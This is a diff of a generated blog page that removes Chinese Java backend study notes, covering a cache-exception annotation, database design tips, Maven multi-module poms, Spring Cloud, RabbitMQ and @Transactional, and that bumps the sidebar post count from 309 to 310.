-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    result = joinPoint.proceed();</span><br><span class="line">&#125; <span class="keyword">catch</span> (Throwable throwable) &#123;</span><br><span class="line">    <span class="comment">//有CacheException注解的方法需要抛出异常</span></span><br><span class="line">    <span class="keyword">if</span> (method.isAnnotationPresent(CacheException.class)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> throwable;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        LOGGER.error(throwable.getMessage());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>CacheException.class</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.macro.mall.security.annotation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 自定义注解，有该注解的缓存方法会抛出异常</span></span><br><span class="line"><span class="comment"> * Created by macro on 2020/3/17.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Documented</span></span><br><span class="line"><span class="meta">@Target(ElementType.METHOD)</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> CacheException &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h1 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h1><h2 id="字段"><a href="#字段" class="headerlink" title="字段"></a>字段</h2><p><img src="https://picgo-freejim.oss-cn-beijing.aliyuncs.com/image-20220427214131128.png" alt="image-20220427214131128"></p>
-<h2 id="小数"><a href="#小数" class="headerlink" title="小数"></a>小数</h2><p><img src="https://picgo-freejim.oss-cn-beijing.aliyuncs.com/image-20220427214355342.png" alt="image-20220427214355342"></p>
-<h2 id="长文本"><a href="#长文本" class="headerlink" title="长文本"></a>长文本</h2><p><img src="https://picgo-freejim.oss-cn-beijing.aliyuncs.com/image-20220427214435031.png" alt="image-20220427214435031"></p>
-<h2 id="适当冗余"><a href="#适当冗余" class="headerlink" title="适当冗余"></a>适当冗余</h2><p><img src="https://picgo-freejim.oss-cn-beijing.aliyuncs.com/image-20220427214525049.png" alt="image-20220427214525049"></p>
-<h2 id="分库分表"><a href="#分库分表" class="headerlink" title="分库分表"></a>分库分表</h2><p><img src="https://picgo-freejim.oss-cn-beijing.aliyuncs.com/image-20220427214540021.png" alt="image-20220427214540021"></p>
-<h2 id="join"><a href="#join" class="headerlink" title="join"></a>join</h2><p><img src="https://picgo-freejim.oss-cn-beijing.aliyuncs.com/image-20220427214631255.png" alt="image-20220427214631255"></p>
-<h2 id="对字符串的索引"><a href="#对字符串的索引" class="headerlink" title="对字符串的索引"></a>对字符串的索引</h2><p><img src="https://picgo-freejim.oss-cn-beijing.aliyuncs.com/image-20220427214654119.png" alt="image-20220427214654119"></p>
-<h2 id="COUNT"><a href="#COUNT" class="headerlink" title="COUNT"></a>COUNT</h2><p><img src="https://picgo-freejim.oss-cn-beijing.aliyuncs.com/image-20220427214906813.png" alt="image-20220427214906813"></p>
-<h2 id="SUM"><a href="#SUM" class="headerlink" title="SUM"></a>SUM</h2><p><img src="https://picgo-freejim.oss-cn-beijing.aliyuncs.com/image-20220427214930276.png" alt="image-20220427214930276"></p>
-<h2 id="外键"><a href="#外键" class="headerlink" title="外键"></a>外键</h2><p><img src="https://picgo-freejim.oss-cn-beijing.aliyuncs.com/image-20220427215028118.png" alt="image-20220427215028118"></p>
-<h2 id="存储过程"><a href="#存储过程" class="headerlink" title="存储过程"></a>存储过程</h2><p><img src="https://picgo-freejim.oss-cn-beijing.aliyuncs.com/image-20220427215043543.png" alt="image-20220427215043543"></p>
-<h2 id="避免IN"><a href="#避免IN" class="headerlink" title="避免IN"></a>避免IN</h2><p><img src="https://picgo-freejim.oss-cn-beijing.aliyuncs.com/image-20220427215122290.png" alt="image-20220427215122290"></p>
-<h2 id="不用"><a href="#不用" class="headerlink" title="不用*"></a>不用*</h2><p><img src="https://picgo-freejim.oss-cn-beijing.aliyuncs.com/image-20220427215158696.png" alt="image-20220427215158696"></p>
-<h2 id="Transactional"><a href="#Transactional" class="headerlink" title="@Transactional"></a>@Transactional</h2><p><img src="https://picgo-freejim.oss-cn-beijing.aliyuncs.com/image-20220427215329156.png" alt="image-20220427215329156"></p>
-<h1 id="设计模式"><a href="#设计模式" class="headerlink" title="设计模式"></a>设计模式</h1><h2 id="Service-Interface存在的意义"><a href="#Service-Interface存在的意义" class="headerlink" title="Service Interface存在的意义"></a>Service Interface存在的意义</h2><ol>
-<li><p>使控制层只依赖这个接口</p>
-</li>
-<li><p>当某天这个应用要跑在其它数据库上时，就而只需要增加一个serviceImpl类（不同的实现）</p>
-</li>
-</ol>
-<p>当然，当项目小，开发人员少或者且开发人员水平较高且接近的情况下</p>
-<p>可以选择不写interface，可以减少编码</p>
-<h1 id="Spring-Cloud"><a href="#Spring-Cloud" class="headerlink" title="Spring Cloud"></a>Spring Cloud</h1><h2 id="Eureka"><a href="#Eureka" class="headerlink" title="Eureka"></a>Eureka</h2><p>The Netflix engineering team built a tool for this called <strong>Eureka</strong>, and open sourced it.</p>
-<p>Eureka provides the means for microservices to power up</p>
-<p>advertise their existence, and shutdown as well.</p>
-<p>It supports multiple copies of the same service registering themselves</p>
-<h2 id="Circuit-Breaker"><a href="#Circuit-Breaker" class="headerlink" title="Circuit Breaker"></a>Circuit Breaker</h2><p><img src="https://picgo-freejim.oss-cn-beijing.aliyuncs.com/image-20220425222632714.png" alt="image-20220425222632714"></p>
-<h1 id="Maven"><a href="#Maven" class="headerlink" title="Maven"></a>Maven</h1><h2 id="多模块"><a href="#多模块" class="headerlink" title="多模块"></a>多模块</h2><p>父模块</p>
-<p>pom.xml</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--模块的信息--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>multi-module-demo<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">packaging</span>&gt;</span>pom<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--指定子模块 --&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">modules</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">module</span>&gt;</span>sub-module1<span class="tag">&lt;/<span class="name">module</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">modules</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--指定项目内的子模块为依赖--&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>sub-module1<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">scope</span>&gt;</span>compile<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-
-<p>子模块</p>
-<p>pom.xml</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--指定父模块关系--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>multi-module-demo<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--该子模块名--&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>sub-module1<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-
-<h1 id="消息队列"><a href="#消息队列" class="headerlink" title="消息队列"></a>消息队列</h1><h2 id="RabbitMQ"><a href="#RabbitMQ" class="headerlink" title="RabbitMQ"></a>RabbitMQ</h2><p>AMQP，即Advanced Message Queuing Protocol</p>
-<h1 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h1><h2 id="错误码"><a href="#错误码" class="headerlink" title="错误码"></a>错误码</h2><p><img src="https://picgo-freejim.oss-cn-beijing.aliyuncs.com/image-20220427212419007.png" alt="image-20220427212419007"></p>
-<h2 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h2><p><img src="https://picgo-freejim.oss-cn-beijing.aliyuncs.com/image-20220427212557721.png" alt="image-20220427212557721"></p>
-<p><img src="https://picgo-freejim.oss-cn-beijing.aliyuncs.com/image-20220427212605295.png" alt="image-20220427212605295"></p>
-<h2 id="NPE"><a href="#NPE" class="headerlink" title="NPE"></a>NPE</h2><p><img src="https://picgo-freejim.oss-cn-beijing.aliyuncs.com/image-20220427212843146.png" alt="image-20220427212843146"></p>
-<h2 id="直接插，再异常处理"><a href="#直接插，再异常处理" class="headerlink" title="直接插，再异常处理"></a>直接插，再异常处理</h2><p>异常处理再去更新</p>
-<h1 id="框架"><a href="#框架" class="headerlink" title="框架"></a>框架</h1><h2 id="Transational"><a href="#Transational" class="headerlink" title="@Transational"></a>@Transational</h2><p>“@Transactional”注解有两个出处，一是来自JAVA官方，包名为“javax.transaction”</p>
-<p>一是来自Spring Framework，包名为“org.springframework.transaction.annotation”</p>
-<p>在Spring框架中，大部分的情况下，它们都可以交换使用,效果是等价的</p>
-<p>只不过Spring Framework提供的“@Transactional”功能更强，粒度更细</p>
-<p>例如支持“TransactionManager”的配置、支持隔离性（isolation）、只读（isolation）、超时(timeout)等</p>
-<h1 id="情景"><a href="#情景" class="headerlink" title="情景"></a>情景</h1><h2 id="token存redis的好处"><a href="#token存redis的好处" class="headerlink" title="token存redis的好处"></a>token存redis的好处</h2><p>服务器重启，仍可用</p>
 
       
     </div>
@@ -1109,7 +1084,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">309</span>
+          <span class="site-state-item-count">310</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
